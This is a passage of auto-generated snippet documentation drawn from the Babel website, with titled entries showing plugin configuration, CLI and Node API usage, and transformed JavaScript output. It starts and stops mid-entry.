MemberExpression(memberPath, state) {\n\n    if (someCondition(memberPath)) {\n\n      // The handle method is supplied by memberExpressionToFunctions.\n      // It should be called whenever a MemberExpression should be\n      // converted into the proper function calls.\n      state.handle(memberPath);\n\n    }\n\n  },\n};\n\n// The helper requires three special methods on state: `get`, `set`, and\n// `call`.\n// Optionally, a special `memoise` method may be defined, which gets\n// called if the member is in a self-referential update expression.\n// Everything else will be passed through as normal.\nconst state = {\n  get(memberPath) {\n    // Return some AST that will get the member\n    return t.callExpression(\n      this.file.addHelper('superGet'),\n      [t.thisExpression(), memberPath.node.property]\n    );\n  },\n\n  set(memberPath, value) {\n    // Return some AST that will set the member\n    return t.callExpression(\n      this.file.addHelper('superSet'),\n      [t.thisExpression(), memberPath.node.property, value]\n    );\n  },\n\n  call(memberPath, args) {\n    // Return some AST that will call the member with the proper context\n    // and args\n    return t.callExpression(\n      t.memberExpression(this.get(memberPath), t.identifier(\"apply\")),\n      [t.thisExpression(), t.arrayExpression(args)]\n    );\n  },\n\n  memoise(memberPath) {\n    const { node } = memberPath;\n    if (node.computed) {\n      MEMOISED.set(node, ...);\n    }\n  },\n\n  // The handle method is provided by memberExpressionToFunctions.\n  // handle(memberPath) { ... }\n\n  // Other state stuff is left untouched.\n  someState: new Set(),\n};\n\n// Replace all the special MemberExpressions in rootPath, as determined\n// by our visitor, using the state methods.\nmemberExpressionToFunctions(rootPath, visitor, state);\n```\n\n----------------------------------------\n\nTITLE: Configuring Async-to-Generator Plugin with Module and Method Options\nDESCRIPTION: This snippet illustrates how to configure the `@babel/transform-async-to-generator` plugin, specifying the `module` and `method` options. It migrates from `@babel/transform-async-to-module-method` by merging its functionality into the regular async plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_32\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"plugins\": [\n-    [\"@babel/transform-async-to-module-method\"]\n+    [\"@babel/transform-async-to-generator\", {\n+      \"module\": \"bluebird\",\n+      \"method\": \"coroutine\"\n+    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration Options Example (JavaScript)\nDESCRIPTION: Demonstrates the structure of configuration options for the babel-plugin-minify-replace plugin. It shows how to specify the identifier to replace and the replacement value. The `identifierName` specifies the identifier to be replaced, and the `replacement` object defines the replacement value's type and value.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    identifierName: \"__DEV__\",\n    replacement: {\n      type: \"numericLiteral\",\n      value: 0,\n    },\n  },\n]\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Demonstrates how to use the @babel/plugin-syntax-export-namespace-from plugin programmatically via the Node API. It transforms the input 'code' string, enabling Babel to parse the 'export namespace from' syntax during the transformation process. It requires the @babel/core package.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-namespace-from.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-export-namespace-from\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Running Babel with the plugin via CLI\nDESCRIPTION: This command runs Babel, specifying the @babel/plugin-transform-unicode-property-regex plugin to be used.  It transforms the script.js file, enabling support for Unicode property escapes in regular expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-property-regex.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/@babel/plugin-transform-unicode-property-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with Plugin JSON\nDESCRIPTION: Shows the recommended way to configure Babel to use the plugin by adding it to the `plugins` array in `babel.config.json`. This approach is recommended for project-wide usage.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-logical-assignment-operators\"]\n}\n```\n\n----------------------------------------\n\nTITLE: CLI: Use Babel Plugin via Command Line\nDESCRIPTION: Shows how to use the Babel plugin via the command line interface. The `--plugins` flag is used to specify the plugin to use when transforming the JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-member-expression-literals.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-member-expression-literals script.js\n```\n\n----------------------------------------\n\nTITLE: ES Module Export Example JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates a simple ES module exporting a default value. It serves as input for the Babel plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default 42;\n```\n\n----------------------------------------\n\nTITLE: Configure Exponentiation Operator Plugin babel.config.json\nDESCRIPTION: This JSON configuration file shows how to enable the @babel/plugin-transform-exponentiation-operator in your Babel project. By adding the plugin to the 'plugins' array, Babel will use it to transform the exponentiation operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-exponentiation-operator.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-exponentiation-operator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Dynamic Import - JavaScript\nDESCRIPTION: This code snippet demonstrates the dynamic import syntax in JavaScript, which allows you to asynchronously load modules.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst testModule = import('test-module');\n```\n\n----------------------------------------\n\nTITLE: Create Function Declaration AST Node (JavaScript)\nDESCRIPTION: Creates a `FunctionDeclaration` AST node using the `t.functionDeclaration` builder.  This node represents a function declaration statement. Parameters include the function identifier, parameters, body, and boolean flags for generator and async functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_72\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.functionDeclaration(id, params, body, generator, async);\n```\n\n----------------------------------------\n\nTITLE: Keeping Input File Extension\nDESCRIPTION: Compiles files in the `src-with-mjs-and-cjs` directory to the `lib` directory, preserving the input file extensions.  The `--keep-file-extension` option maintains the original file extensions in the output files.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_20\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src-with-mjs-and-cjs --out-dir lib --keep-file-extension\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/preset-env with Browserslist 'defaults' query in JavaScript\nDESCRIPTION: This snippet demonstrates how to configure `@babel/preset-env` to use the `defaults` Browserslist query for specifying browser targets. It shows the configuration object passed to the preset, including the `targets` option with `browsers: \"defaults\"`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  presets: [\n    [\"@babel/preset-env\", {\n      targets: { browsers: \"defaults\" }\n    }]\n  ]\n};\n```\n\n----------------------------------------\n\nTITLE: Decorators in Babel 8\nDESCRIPTION: Illustrates the use of decorators in Babel 8 for class modification and enhancement.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n@a class A {}\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage Example\nDESCRIPTION: This JavaScript code demonstrates how to use the Babel Node API to transform code with the `@babel/plugin-proposal-async-do-expressions` plugin.  It uses `transformSync` to synchronously transform the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-async-do-expressions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: ES6 JavaScript using @babel/standalone\nDESCRIPTION: This snippet uses an ES6 arrow function within a `<script type=\"text/babel\">` tag. @babel/standalone will transpile this code into compatible JavaScript for older browsers.  The output is then displayed in an HTML element with the ID 'output'.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browser/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst getMessage = () => \"Hello World\";\ndocument.getElementById('output').innerHTML = getMessage();\n```\n\n----------------------------------------\n\nTITLE: Enabling legacy decorators proposal in Babel\nDESCRIPTION: This snippet demonstrates how to enable support for the legacy decorator proposal using the `@babel/plugin-proposal-decorators` plugin. The `legacy: true` option is used to ensure compatibility with the legacy decorator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  plugins: [[\"@babel/plugin-proposal-decorators\", { legacy: true }]],\n};\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage (Shell)\nDESCRIPTION: Example command-line usage of Babel to transform a JavaScript file using the @babel/plugin-transform-react-jsx plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-jsx script.js\n```\n\n----------------------------------------\n\nTITLE: Importing Babel Core in JavaScript\nDESCRIPTION: Demonstrates how to import the @babel/core package using different JavaScript module systems. It showcases the use of `require`, named imports with `transform`, and namespace imports with `* as babel`.  These methods allow developers to access Babel's functionality in their projects.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar babel = require(\"@babel/core\");\nimport { transform } from \"@babel/core\";\nimport * as babel from \"@babel/core\";\n```\n\n----------------------------------------\n\nTITLE: Object Spread - Object Expression (JavaScript)\nDESCRIPTION: Demonstrates the spread property in object expressions. It shows how to merge properties from multiple objects into a single object.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a = { ...b, ...c } // ObjectExpression\n```\n\n----------------------------------------\n\nTITLE: Import JSON Module with Type Attribute (JavaScript)\nDESCRIPTION: Shows how to import a JSON module using the 'with' keyword and the 'type' attribute, indicating that the module should be treated as JSON. This ensures correct parsing and handling of the imported data. Babel now parses import attributes by default.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-10-25-7.26.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport data from \"./data\" with { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Compiled Class Properties (setPublicClassFields = false)\nDESCRIPTION: Compiled output of the class properties example when `setPublicClassFields` is `false`. It utilizes `Object.defineProperty` for defining class properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Bork = function Bork() {\n  babelHelpers.classCallCheck(this, Bork);\n  Object.defineProperty(this, \"x\", {\n    configurable: true,\n    enumerable: true,\n    writable: true,\n    value: \"bar\",\n  });\n  Object.defineProperty(this, \"y\", {\n    configurable: true,\n    enumerable: true,\n    writable: true,\n    value: void 0,\n  });\n};\n\nObject.defineProperty(Bork, \"a\", {\n  configurable: true,\n  enumerable: true,\n  writable: true,\n  value: \"foo\",\n});\nObject.defineProperty(Bork, \"b\", {\n  configurable: true,\n  enumerable: true,\n  writable: true,\n  value: void 0,\n});\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Assignment Output Example (JavaScript)\nDESCRIPTION: This JavaScript code shows the result of transforming the input code with optional chaining. The plugin replaces the optional chaining assignment with a conditional expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-optional-chaining-assign.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nfunction doSomething(maybeOptions) {\n  maybeOptions !== null && maybeOptions !== void 0 && maybeOptions.retries = 5;\n}\n```\n\n----------------------------------------\n\nTITLE: Installation via npm - Shell\nDESCRIPTION: This command installs the @babel/plugin-transform-duplicate-keys plugin as a development dependency using npm. This plugin will transform duplicate keys in object literals into computed properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-keys.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-duplicate-keys\n```\n\n----------------------------------------\n\nTITLE: Transform Node ENV Inline Example\nDESCRIPTION: This example demonstrates how the babel-plugin-transform-node-env-inline plugin transforms JavaScript code that references `process.env.NODE_ENV`. The plugin replaces these references with boolean values based on the `NODE_ENV` environment variable.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nprocess.env.NODE_ENV === \"development\";\nprocess.env.NODE_ENV === \"production\";\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/register\nDESCRIPTION: This command installs the @babel/core and @babel/register packages as development dependencies using npm.  @babel/core is required for babel to function.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install @babel/core @babel/register --save-dev\n```\n\n----------------------------------------\n\nTITLE: Transformed UMD Module JavaScript\nDESCRIPTION: This JavaScript code shows the output of the Babel plugin when transforming the ES module to UMD format. It creates a UMD wrapper that checks for different module systems.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n(function(global, factory) {\n  if (typeof define === \"function\" && define.amd) {\n    define([\"exports\"], factory);\n  } else if (typeof exports !== \"undefined\") {\n    factory(exports);\n  } else {\n    var mod = {\n      exports: {},\n    };\n    factory(mod.exports);\n    global.actual = mod.exports;\n  }\n})(this, function(exports) {\n  \"use strict\";\n\n  Object.defineProperty(exports, \"__esModule\", {\n    value: true,\n  });\n\n  exports.default = 42;\n});\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API\nDESCRIPTION: This JavaScript code demonstrates how to use the `@babel/plugin-transform-literals` plugin via the Node API. It utilizes `@babel/core` and the `transformSync` function to transform the input code. Dependencies: `@babel/core`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-literals.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-literals\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transform dynamic import to SystemJS\nDESCRIPTION: This code demonstrates how a dynamic import is transformed into a SystemJS module format. The `import()` call is replaced with `_context.import()` within the SystemJS module definition. It requires the `@babel/plugin-transform-modules-systemjs` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nSystem.register([], function (_export, _context) {\n  \"use strict\";\n\n  return {\n    setters: [],\n    execute: function () {\n      _context.import(\"jquery\").then(($) => {});\n    }\n  };\n});\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/preset-stage-1\nDESCRIPTION: This command installs the `@babel/preset-stage-1` package as a development dependency using npm. This allows Babel to use the stage-1 preset during the transformation process. The `--save-dev` flag ensures that the package is added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-1.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-stage-1\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI (Shell)\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a file with the `@babel/plugin-transform-react-jsx-compat` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-compat.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-jsx-compat script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API and the `@babel/plugin-proposal-throw-expressions` plugin.  It takes JavaScript code as a string and an object containing the plugin configuration.  It returns the transformed code. Requires `@babel/core`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-throw-expressions.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-throw-expressions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Object Super Transformation Output (JavaScript)\nDESCRIPTION: Shows the output JavaScript code after applying the @babel/plugin-transform-object-super plugin. The code transforms the `super` call into an equivalent implementation that works in environments that don't natively support `super` in object literals. The output includes a helper function `_get` to handle the super call lookup.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-super.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nvar _obj;\n\nvar _get = function get(object, property, receiver) {\n  if (object === null) object = Function.prototype;\n  var desc = Object.getOwnPropertyDescriptor(object, property);\n  if (desc === undefined) {\n    var parent = Object.getPrototypeOf(object);\n    if (parent === null) {\n      return undefined;\n    } else {\n      return get(parent, property, receiver);\n    }\n  } else if (\"value\" in desc) {\n    return desc.value;\n  } else {\n    var getter = desc.get;\n    if (getter === undefined) {\n      return undefined;\n    }\n    return getter.call(receiver);\n  }\n};\n\nvar obj = {\n  say: function say() {\n    return \"Hello\";\n  },\n};\n\nvar obj2 = (_obj = {\n  say: function say() {\n    return (\n      _get(_obj.__proto__ || Object.getPrototypeOf(_obj), \"say\", this).call(\n        this\n      ) + \"World!\"\n    );\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API (JavaScript)\nDESCRIPTION: This JavaScript snippet shows how to use the @babel/plugin-transform-unicode-sets-regex plugin via the Babel Node API.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-unicode-sets-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transformed Generator Function Output (JavaScript)\nDESCRIPTION: This code shows the output of the `@babel/plugin-transform-regenerator` plugin. The generator function is transformed into a form that can run in older environments.  It uses `regeneratorRuntime` to simulate generator behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _marked = [a].map(regeneratorRuntime.mark);\n\nfunction a() {\n  return regeneratorRuntime.wrap(\n    function a$(_context) {\n      while (1) {\n        switch ((_context.prev = _context.next)) {\n          case 0:\n            _context.next = 2;\n            return 1;\n\n          case 2:\n          case \"end\":\n            return _context.stop();\n        }\n      }\n    },\n    _marked[0],\n    this\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - Parameter Destructuring (JavaScript)\nDESCRIPTION: Demonstrates object rest spread within function parameters. It highlights how the rest property captures the remaining properties after destructuring specific ones.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction a({ b, ...c }) {} // Parameters\n```\n\n----------------------------------------\n\nTITLE: Creating a ConditionalExpression AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.conditionalExpression` to create a conditional expression node in the AST. It requires three expression nodes: test, consequent, and alternate. The resulting node represents a ternary operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_29\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.conditionalExpression(test, consequent, alternate);\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI (Shell)\nDESCRIPTION: Demonstrates how to use the plugin through the Babel CLI. This command instructs Babel to transpile files, applying the specified plugin during the transformation.  It requires Babel CLI to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-private-property-in-object\n```\n\n----------------------------------------\n\nTITLE: Transforming a File Asynchronously (Promise)\nDESCRIPTION: Demonstrates how to use `babel.transformFileAsync` to asynchronously transform the contents of a file using Promises. The function takes the filename and options, returning a Promise that resolves with an object containing the transformed code, source map, and AST. Requires @babel/core and file system access.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFileAsync(filename, options); // => Promise<{ code, map, ast }>\n```\n\n----------------------------------------\n\nTITLE: Configuration for Source Phase Import\nDESCRIPTION: This JSON configuration snippet shows how to configure Babel to transform source imports for WebAssembly modules using the `@babel/plugin-proposal-import-wasm-source` plugin. It includes a `targets` field specifying compatible browsers and Node.js version.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": [\"chrome 90\", \"firefox 90\", \"node 20.6\"],\n  \"plugins\": [\"@babel/plugin-proposal-import-wasm-source\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/plugin-syntax-typescript with babel.config.json\nDESCRIPTION: This JSON configuration enables the @babel/plugin-syntax-typescript plugin. This allows Babel to parse TypeScript syntax when transforming JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-typescript.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-typescript\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Targets with Node Version in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel's `targets` option to target a specific Node.js version.  It sets the target to Node.js 12.0.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": \"node 12.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack with Babel Loader and Babili Preset\nDESCRIPTION: This snippet shows how to configure Webpack to use Babel Loader with the `babili` preset. This allows Webpack to use Babili for minifying JavaScript files during the bundling process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule: {\n  loaders: [\n    {\n      test: /\\.js$/,\n      loader: 'babel',\n      query: {\n        presets: ['babili']\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Command-line usage of Babel to transform a JavaScript file (`script.js`) using the `@babel/plugin-proposal-do-expressions` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-do-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration (No Options)\nDESCRIPTION: Example of a babel.config.json file configuring the @babel/plugin-transform-modules-systemjs plugin without any specific options. This is the simplest way to enable the plugin when using a configuration file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-modules-systemjs\"]\n}\n```\n\n----------------------------------------\n\nTITLE: babel.config.json override example\nDESCRIPTION: Example showing how to use the ignoreExtensions option to use the TS plugin for vue files.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-react\"],\n  \"overrides\": [{\n    \"test\": \"*.vue\",\n    \"presets\": [\n      [\"@babel/preset-typescript\"], { \"ignoreExtensions\": true }\n    ]\n  }]\n}\n```\n\n----------------------------------------\n\nTITLE: Const Enum Default Output\nDESCRIPTION: Default JavaScript output when `optimizeConstEnums` is disabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nvar Animals;\n\n(function(Animals) {\n  Animals[(Animals[\"Fish\"] = 0)] = \"Fish\";\n})(Animals || (Animals = {}));\n\nconsole.log(Animals.Fish);\n```\n\n----------------------------------------\n\nTITLE: Running Babel via CLI\nDESCRIPTION: Runs Babel from the command line, specifying the `@babel/plugin-syntax-import-meta` plugin. It takes `script.js` as an input and transforms it using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-meta.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-import-meta script.js\n```\n\n----------------------------------------\n\nTITLE: Enabling Experimental TypeScript Namespaces Support in JavaScript\nDESCRIPTION: This snippet shows how to enable experimental support for TypeScript namespaces by configuring the `@babel/plugin-transform-typescript` plugin.  The `allowNamespaces` option is set to `true` to enable the feature. Requires `@babel/plugin-transform-typescript` as a dependency.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    [\"@babel/plugin-transform-typescript\", {\n      allowNamespaces: true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript 4.5 Import Syntax\nDESCRIPTION: This code snippet illustrates the new syntax in TypeScript 4.5 for marking imports as type-only.  Instead of marking the whole import statement, you can mark individual specifiers. This allows for more concise and readable code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-10-29-7.16.0.md#_snippet_1\n\nLANGUAGE: TypeScript\nCODE:\n```\n// TypeScript 4.4\nimport type { Foo } from \"my-module\";\nimport { fooInstance } from \"my-module\";\n\n// TypeScript 4.5\nimport { type Foo, fooInstance } from \"my-module\";\n```\n\n----------------------------------------\n\nTITLE: Configuration for Deferred Import Evaluation\nDESCRIPTION: This JSON configuration shows how to configure Babel to support the `import defer` syntax using the `@babel/plugin-transform-modules-commonjs` and `@babel/plugin-proposal-import-defer` plugins.  It is essential to compile modules via Babel when using this feature.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-transform-modules-commonjs\",\n    \"@babel/plugin-proposal-import-defer\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with the Plugin (JSON)\nDESCRIPTION: Demonstrates how to configure Babel to use the @babel/plugin-syntax-nullish-coalescing-operator using a babel.config.json file. This configuration enables Babel to recognize and parse the nullish coalescing operator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-nullish-coalescing-operator.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-nullish-coalescing-operator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Babel build script to package.json (diff)\nDESCRIPTION: This code snippet demonstrates how to add a \"build\" script to the \"scripts\" section of the `package.json` file. The script uses the Babel CLI to transpile files from the `src` directory to the `lib` directory. It assumes that `@babel/cli` is installed as a dev dependency.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_cli/usage.md#_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n  {\n    \"name\": \"my-project\",\n    \"version\": \"1.0.0\",\n+   \"scripts\": {\n+     \"build\": \"babel src -d lib\"\n+   },\n    \"devDependencies\": {\n      \"@babel/cli\": \"^7.0.0\"\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json JSON\nDESCRIPTION: This JSON configuration shows how to enable the @babel/plugin-transform-async-to-generator plugin in babel.config.json without any options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-async-to-generator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin (babel.config.json)\nDESCRIPTION: This example demonstrates how to configure the @babel/plugin-transform-template-literals plugin in a babel.config.json file without any options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-template-literals\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Class transformation with @babel/plugin-transform-runtime\nDESCRIPTION: This snippet showcases how `@babel/plugin-transform-runtime` replaces the duplicated `_classCallCheck` helper function with a reference to the `@babel/runtime-corejs2` package. This reduces code duplication and improves overall bundle size.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime-corejs2.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _classCallCheck = require(\"@babel/runtime-corejs2/helpers/classCallCheck\");\n\nvar Circle = function Circle() {\n  _classCallCheck(this, Circle);\n};\n```\n\n----------------------------------------\n\nTITLE: Using Babel Node API\nDESCRIPTION: This JavaScript snippet showcases how to use the Babel Node API to transform code using the @babel/preset-react preset. It transforms the input 'code' and returns the transformed output.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-react\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Setting Output File Extension\nDESCRIPTION: Compiles files in the `src` directory to the `lib` directory and sets the output file extension to `.mjs`.  The `--out-file-extension` option controls the output file extension.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_19\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-dir lib --out-file-extension .mjs\n```\n\n----------------------------------------\n\nTITLE: Install 